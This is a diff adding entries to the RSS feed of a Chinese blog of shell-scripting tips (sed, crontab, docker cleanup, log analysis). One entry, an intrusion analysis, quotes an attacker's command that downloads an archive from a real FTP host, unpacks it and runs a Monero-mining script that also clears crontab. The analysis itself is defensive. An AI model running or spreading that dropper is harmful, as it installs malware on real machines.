@@ -30,6 +30,28 @@
     </item>
     
     <item>
+      <title>sed替换</title>
+      <link>https://wdd.js.org/shell/sed-tips/</link>
+      <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/sed-tips/</guid>
+      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
+The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html
+# 可以用#来替代/ sed &amp;#39;s#ABC#de/#g&amp;#39; some.</description>
+    </item>
+    
+    <item>
+      <title>sed替换</title>
+      <link>https://wdd.js.org/shell/set-replace/</link>
+      <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/set-replace/</guid>
+      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
+The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html
+# 可以用#来替代/ sed &amp;#39;s#ABC#de/#g&amp;#39; some.</description>
+    </item>
+    
+    <item>
       <title>Ack 在contab中无法查到关键词</title>
       <link>https://wdd.js.org/shell/contab-ack/</link>
       <pubDate>Fri, 18 Jun 2021 00:00:00 +0800</pubDate>
@@ -39,6 +61,26 @@
 stage_count=$(ack -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l) 最终使用--nofilter参数，解决了问题。
 stage_count=$(ack --nofilter -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l) 参考
 https://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline </description>
+    </item>
+    
+    <item>
+      <title>设置变量默认值</title>
+      <link>https://wdd.js.org/shell/default-var/</link>
+      <pubDate>Wed, 03 Jun 2020 18:44:33 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/default-var/</guid>
+      <description>用法 Parameter What does it do? ${VAR:-STRING} If VAR is empty or unset, use STRING as its value. ${VAR-STRING} If VAR is unset, use STRING as its value. ${VAR:=STRING} If VAR is empty or unset, set the value of VAR to STRING. ${VAR=STRING} If VAR is unset, set the value of VAR to STRING. ${VAR:+STRING} If VAR is not empty, use STRING as its value. ${VAR+STRING} If VAR is set, use STRING as its value.</description>
+    </item>
+    
+    <item>
+      <title>比较与测试</title>
+      <link>https://wdd.js.org/shell/cond-test/</link>
+      <pubDate>Mon, 11 May 2020 13:01:07 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/cond-test/</guid>
+      <description>if # if if condition; then commands; fi # if else if if condition; then commands; elif condition; then commands; else commands; fi 简单版本的if测试
+[ condtion ] &amp;amp;&amp;amp; action; [ conditio ] || action; 算数比较 [ $var -eq 0 ] #当var等于0 [ $var -ne 0 ] #当var不等于0 -gt 大于 -lt 小于 -ge 大于或等于 -le 小于或等于 使用-a, -o可以组合复杂的测试。
+[ $var -ne 0 -a $var -gt 2 ] # -a相当于并且 [ $var -ne 0 -o $var -gt 2 ] # -o相当于或 文件比较 [ -f $file ] # 如果file是存在的文件路径或者文件名，则返回真 -f 测试文件路径或者文件是否存在 -x 测试文件是否可执行 -e 测试文件是否存在 -c 测试文件是否是字符设备 -b 测试文件是否是块设备 -w 测试文件是否可写 -r 测试文件是否可读 -L 测试文件是否是一个符号链接 字符串比较 字符串比较一定要用双中括号。</description>
     </item>
     
     <item>
@@ -54,6 +96,153 @@ tar -zxvf 压缩文件名.tar.gz 解压缩后的文件只能放在当前的目�
 crontab 每隔x秒执行一次 每隔5秒
 * * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done 每隔15秒
 * * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 awk从第二行开始读取 awk &amp;#39;NR&amp;gt;2{print $1}&amp;#39; 查找大文件，并清空文件内容 find /var/log -type f -size +1M -exec truncate --size 0 &amp;#39;{}&amp;#39; &amp;#39;;&amp;#39; switch case 语句 echo &amp;#39;Input a number between 1 to 4&amp;#39; echo &amp;#39;Your number is:\c&amp;#39; read aNum case $aNum in 1) echo &amp;#39;You select 1&amp;#39; ;; 2) echo &amp;#39;You select 2&amp;#39; ;; 3) echo &amp;#39;You select 3&amp;#39; ;; 4) echo &amp;#39;You select 4&amp;#39; ;; *) echo &amp;#39;You do not select a number between 1 to 4&amp;#39; ;; esac 以$开头的特殊变量 echo $$ # 进程pid echo $# # 收到的参数个数 echo $@ # 列表方式的参数 $1 $2 $3 echo $?</description>
+    </item>
+    
+    <item>
+      <title>手工安装oh-my-zsh</title>
+      <link>https://wdd.js.org/shell/manu-install-ohmyzsh/</link>
+      <pubDate>Fri, 27 Dec 2019 09:29:41 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/manu-install-ohmyzsh/</guid>
+      <description>yum install zsh -y # github上的项目下载太慢，所以我就把项目克隆到gitee上，这样克隆速度就非常快 git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh # 这一步是可选的 cp ~/.zshrc ~/.zshrc.orig # 这一步是必须的 cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # 改变默认的sh, 如果这一步报错，就再次输入 zsh chsh -s $(which zsh) </description>
+    </item>
+    
+    <item>
+      <title>m4读取环境变量</title>
+      <link>https://wdd.js.org/shell/m4-env/</link>
+      <pubDate>Fri, 27 Dec 2019 09:28:53 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/m4-env/</guid>
+      <description>define(`CF_INNER_IP&amp;#39;, `esyscmd(`printf &amp;#34;$PWD&amp;#34;&amp;#39;)&amp;#39;) </description>
+    </item>
+    
+    <item>
+      <title>pure-bash-bible</title>
+      <link>https://wdd.js.org/shell/pure-bash-bible/</link>
+      <pubDate>Thu, 26 Dec 2019 13:46:31 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/pure-bash-bible/</guid>
+      <description>字符串 字符串包含 Using a test:
+if [[ $var == *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is in var.&amp;#34; fi # Inverse (substring not in string). if [[ $var != *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is not in var.&amp;#34; fi # This works for arrays too! if [[ ${arr[*]} == *sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;sub_string is in array.&amp;#34; fi Using a case statement:
+case &amp;#34;$var&amp;#34; in *sub_string*) # Do stuff ;; *sub_string2*) # Do more stuff ;; *) # Else ;; esac 字符串开始 if [[ $var == sub_string* ]]; then printf &amp;#39;%s\n&amp;#39; &amp;#34;var starts with sub_string.</description>
+    </item>
+    
+    <item>
+      <title>列出网络中活动的主机</title>
+      <link>https://wdd.js.org/shell/list-active-host/</link>
+      <pubDate>Thu, 26 Dec 2019 10:34:15 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/list-active-host/</guid>
+      <description>使用ping 优点 原生，不用安装软件 缺点 速度慢 下面的脚本列出 192.168.1.0/24的所有主机，大概需要255秒
+#!/bin/bash function handler () { echo &amp;#34;will exit&amp;#34; exit 0 } trap &amp;#39;handler&amp;#39; SIGINT for ip in 192.168.1.{1..255} do ping -W 1 -c 1 $ip &amp;amp;&amp;gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive else echo $ip is dead fi done 使用fping 优点 速度快 缺点 需要安装fping # 安装fping brew install fping # mac yum install fping # centos apt install fping # debian 我用的fping 是MacOS X， fping的版本是4.</description>
+    </item>
+    
+    <item>
+      <title>入侵脚本分析 - 瞒天过海</title>
+      <link>https://wdd.js.org/shell/evil-script/</link>
+      <pubDate>Mon, 23 Dec 2019 18:54:01 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/evil-script/</guid>
+      <description>机器被入侵了，写点东西，分析一下入侵脚本，顺便也学习一下。
+bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r 下载恶意软件 恶意软件的是使用 ftp下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个153.122.137.67 IP是位于日本东京，ssd.taz是一个tar包，用tar解压之后，出现一个sh文件，两个可执行文件。
+-rwxr-xr-x 1 1001 1001 907 Nov 20 20:58 go # shell -rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # 可执行 -rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # 可执行 分析可执行文件 go go是一个shell程序，下文是分析
+#!/bin/bash # pool.supportxmr.com门罗币的矿池 # 所以大家应该清楚了，入侵的机器应该用来挖矿的 # 这一步是测试本机与矿池dns是否通 if [ $(ping -c 1 pool.supportxmr.com 2&amp;gt;/dev/null|grep &amp;#34;bytes of data&amp;#34; | wc -l ) -gt &amp;#39;0&amp;#39; ]; then dns=&amp;#34;&amp;#34; # dns通 else dns=&amp;#34;-d&amp;#34; # dns不通 fi # 删除用户计划任务，并将报错信息清除 crontab -r 2&amp;gt;/dev/null # 这一步不太懂 rm -rf /tmp/.</description>
+    </item>
+    
+    <item>
+      <title>shell数学运算</title>
+      <link>https://wdd.js.org/shell/match-eval/</link>
+      <pubDate>Sat, 26 Oct 2019 14:18:08 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/match-eval/</guid>
+      <description>主要的数据运算方式
+let (()) [] expr bc 使用let 使用let时，等号右边的变量不需要在加上$符号
+#!/bin/bash no1=1; no2=2; # 注意两个变量的值的类型实际上是字符串 re1=$no1+$no2 # 注意此时re1的值是1+2 let result=no1+no2 # 此时才是想获取的两数字的和，3 </description>
+    </item>
+    
+    <item>
+      <title>字符串操作</title>
+      <link>https://wdd.js.org/shell/string-operator/</link>
+      <pubDate>Sat, 26 Oct 2019 14:16:28 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/string-operator/</guid>
+      <description>
+获取字符串长度 需要在变量前加个**#**
+name=wdd echo ${#name} 首尾去空格 echo &amp;#34; abcd &amp;#34; | xargs 字符串包含 # $var是否包含字符串A if [[ $var =~ &amp;#34;A&amp;#34; ]]; then echo fi # $var是否以字符串A开头 if [[ $var =~ &amp;#34;^A&amp;#34; ]]; then echo fi # $var是否以字符串A结尾 if [[ $var =~ &amp;#34;A$&amp;#34; ]]; then echo fi 字符串提取 #!/bin/bash num1=${test#*_} num2=${num1#*_} surname=${num2%_*} num4=${test##*_} profession=${num4%.*} #*_ 从左边开始，去第一个符号“_”左边的所有字符 % _* 从右边开始，去掉第一个符号“_”右边的所有字符 ##*_ 从右边开始，去掉第一个符号“_”左边的所有字符 %%_* 从左边开始，去掉第一个符号“_”右边的所有字符 判断某个字符串是否以特定字符开头 if [[ $TAG =~ ABC* ]]; then echo $TAG is begin with ABC fi </description>
+    </item>
+    
+    <item>
+      <title>流程控制</title>
+      <link>https://wdd.js.org/shell/flow-control/</link>
+      <pubDate>Fri, 18 Oct 2019 13:06:58 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/flow-control/</guid>
+      <description>
+if then // good if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // good if [ -d public ]; then echo &amp;#34;public exist&amp;#34; if // error: if和then写成一行时，条件后必须加上分号 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // error: shell对空格比较敏感，多个空格和少个空格，执行的含义完全不同 // 在[]中，内侧前后都需要加上空格 if [-d public] then echo &amp;#34;public exist&amp;#34; if if elif then if [ -d public ] then echo &amp;#34;public exist&amp;#34; elif then 循环 switch 常用例子 判断目录是否存在 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if 判断文件是否存在 </description>
+    </item>
+    
+    <item>
+      <title>彩色文本与彩色背景打印</title>
+      <link>https://wdd.js.org/shell/colorful-print/</link>
+      <pubDate>Wed, 16 Oct 2019 13:57:29 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/colorful-print/</guid>
+      <description>
+打印彩色字体 0 重置 30 黑色 31 红色 32 绿色 33 黄色 34 蓝色 35 洋红 36 青色 37 白色 把31改成其他数字，就可打印其他颜色的this了。大部分情况下，我们只需要记住红色和绿色就可以了
+echo -e &amp;#34;\e[1;31m this \e[0m whang&amp;#34; 打印彩色背景 0 重置 40 黑色 41 红色 42 绿色 43 黄色 44 蓝色 45 洋红 46 青色 47 白色 echo -e &amp;#34;\e[1;45m this \e[0m whang&amp;#34; </description>
+    </item>
+    
+    <item>
+      <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
+      <link>https://wdd.js.org/shell/grep-awk-sort/</link>
+      <pubDate>Tue, 15 Oct 2019 21:35:15 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/grep-awk-sort/</guid>
+      <description>test.log
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列
+日志列数比较少或则要提取的字段比较靠前时，优先使用awk。当然cut也可以做到。
+比如输出日志的第三列
+awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取cause字段的原因值？
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用grep的正则提取。
+好像grep不支持捕获分组，所以只能提取出出cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出AAA
+E 表示使用正则 o 表示只显示匹配到的内容 &amp;gt; grep -Eo &amp;#39;cause:&amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>Docker镜像批量清理脚本</title>
+      <link>https://wdd.js.org/shell/docker-clean-tips/</link>
+      <pubDate>Tue, 06 Aug 2019 13:48:13 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/docker-clean-tips/</guid>
+      <description>使用jenkins作为打包的工具，主机上的磁盘空间总是被慢慢被占满，直到jenkins无法运行。本文从几个方面来清理docker垃圾。
+批量删除已经退出的容器 docker ps -a | grep &amp;#34;Exited&amp;#34; | awk &amp;#39;{print $1 }&amp;#39; | xargs docker rm 批量删除带有none字段的镜像 $3一般就是取出每一行的镜像id字段
+# 方案1： 根据镜像id删除镜像 docker images| grep none |awk &amp;#39;{print $3 }&amp;#39;|xargs docker rmi # 方案2: 根据镜像名删除镜像 docker images | grep wecloud | awk &amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39; | xargs docker rmi 方案1，根据镜像ID删除镜像时，有写镜像虽然镜像名不同，但是镜像ID都是相同的，这是后往往会删除失败。所以根据镜像名删除镜像的效果会更好。
+删除镜像定时任务脚本 #!/bin/bash # create by wangduanduan # when current free disk less then max free disk, you can remove docker images # GREEN=&amp;#39;\033[0;32m&amp;#39; RED=&amp;#39;\033[0;31m&amp;#39; NC=&amp;#39;\033[0m&amp;#39; max_free_disk=5 # 5G.</description>
+    </item>
+    
+    <item>
+      <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
+      <link>https://wdd.js.org/shell/log-ana/</link>
+      <pubDate>Tue, 06 Aug 2019 11:24:53 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/log-ana/</guid>
+      <description>test.log
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列日志列数比较少或则要提取的字段比较靠前时，优先使用awk。当然cut也可以做到。比如输出日志的第三列
+awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取cause字段的原因值？
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用grep的正则提取。好像grep不支持捕获分组，所以只能提取出出cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出AAA
+E 表示使用正则 o 表示只显示匹配到的内容 &amp;gt; grep -Eo &amp;#39;cause:&amp;#34;.*?&amp;#34;&amp;#39; test.log cause:&amp;#34;AAA&amp;#34; cause:&amp;#34;BBB&amp;#34; cause:&amp;#34;AAA&amp;#34; cause:&amp;#34;BBJ&amp;#34; 统计 对输出的关键词进行统计，并按照升序或者降序排列。将关键词按照列或者按照正则提取出来之后，首先要进行sort排序, 然后再进行uniq去重。不进行排序就直接去重，统计的值就不准确。因为uniq去重只能去除连续的相同字符串。不是连续的字符串，则会统计多次。下面例子：非连续的cause:&amp;ldquo;AAA&amp;rdquo;，没有被合并在一起计数</description>
+    </item>
+    
+    <item>
+      <title>长太息以掩涕兮，哀crontab之难用</title>
+      <link>https://wdd.js.org/shell/crontab-tips/</link>
+      <pubDate>Mon, 01 Jul 2019 18:59:57 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/shell/crontab-tips/</guid>
+      <description>我已经在crontab上栽了很多次跟头了，我决定写个总结。
+常用的命令 crontab -l # 显示计划任务脚本 crontab -e # 编辑计划任务 计划任务的格式 时间格式 * # 每个最小单元 / # 时间步长，每隔多长时间执行 */10 - # 区间，如 4-9 , # 散列，如 4,9,10 几个例子 crontab 最小支持的时间单位是1分钟，不支持每个多少秒执行一次
+# 每分钟执行 * * * * * cmd # 每小时的15，45分钟执行 15,45 * * * * cmd # 每个周一到周五，早上9点到下午6点之间，每隔15分钟喝一次水 */15 9,18 * * 1-5 喝水 每个X秒执行 crontab的默认最小执行周期是1分钟，如果想每隔多少秒执行一次，就需要一些特殊的手段。
+每隔5秒 * * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done 每隔15秒 * * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 为什么crontab指定的脚本没有执行？ 有以下可能原因</description>
     </item>
     
   </channel>
